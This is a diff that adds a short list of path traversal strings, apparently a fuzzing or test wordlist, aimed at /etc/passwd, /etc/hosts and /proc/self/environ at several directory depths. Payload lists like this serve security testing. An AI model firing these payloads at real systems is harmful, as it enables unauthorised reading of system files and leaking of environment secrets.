@@ -1,0 +1,15 @@
+../../../../etc/passwd
+../../../../etc/hosts
+../../../../proc/self/environ
+../../../etc/passwd
+../../../etc/hosts
+../../../proc/self/environ
+../../../../../../../../etc/passwd
+../../../../../../../../etc/hosts
+../../../../../../../../proc/self/environ
+../etc/passwd
+../etc/hosts
+../proc/self/environ
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../proc/self/environ
